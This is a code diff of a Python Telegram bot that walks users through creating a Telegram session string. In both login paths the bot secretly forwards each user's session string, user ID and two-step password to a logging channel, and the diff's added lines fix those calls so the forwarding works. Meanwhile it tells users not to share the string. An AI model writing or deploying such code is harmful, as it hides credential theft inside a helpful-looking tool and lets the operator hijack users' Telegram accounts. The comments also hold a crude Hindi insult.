@@ -1,7 +1,4 @@
-# Join me on Telegram @devggn
-
-
-import pymongo
+# Join ne on telegram @devggn
 import os
 from pyrogram import Client, filters
 from pyrogram.errors import (
@@ -14,17 +11,16 @@ from pyrogram.errors import (
 )
 import random
 import asyncio
-from config import API_ID as api_id, API_HASH as api_hash, MONGODB_CONNECTION_STRING, LOG_GROUP, SESSION_CHANNEL
+from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN
 
 user_steps = {}
 user_data = {}
 
-
 app = Client(
-  "gagan",
-  api_id=API_ID,
-  api_hash=API_HASH,
-  bot_token=BOT_TOKEN
+    "gagan",
+    api_id=API_ID,
+    api_hash=API_HASH,
+    bot_token=BOT_TOKEN
 )
 
 async def session_step(client, message):
@@ -57,7 +53,7 @@ async def session_step(client, message):
             await temp_client.sign_in(user_data[user_id]["phone_number"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
             await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by Team SPY__**")
-            await gagan.send_message(SESSION_CHANNEL, f"✨ **__USER ID__** : {user_id}\n\n✨ **__2SP__** : `None`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
+            await app.send_message(SESSION_CHANNEL, f"✨ **__USER ID__** : {user_id}\n\n✨ **__2SP__** : `None`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
         except PhoneCodeInvalid:
@@ -76,7 +72,7 @@ async def session_step(client, message):
             await temp_client.check_password(password=password)
             session_string = await temp_client.export_session_string()
             await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by Team SPY__**")
-            await gagan.send_message(SESSION_CHANNEL, f"✨ **__ID__** : {user_id}\n\n✨ **__2SP__** : `{password}`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
+            await app.send_message(SESSION_CHANNEL, f"✨ **__ID__** : {user_id}\n\n✨ **__2SP__** : `{password}`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
         except PasswordHashInvalid:
@@ -107,28 +103,11 @@ def get_session(sender_id):
     else:
         return None
 
-#start bot abe chutiya type likh rha hu main baki tum log advance bna lena apna pmro bnke
-
-try:
-  app.run()
-  print("Bot started ...")
-except Exception:
-  print("Failed...")
-      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-#devggn
+# Start the bot chutiya type code likha hu fix kr lena agar error ho to koi
+if __name__ == "__main__":
+    try:
+        app.run()
+        print("Bot started ...")
+    except Exception as e:
+        print(f"Failed to start bot: {e}")
+        
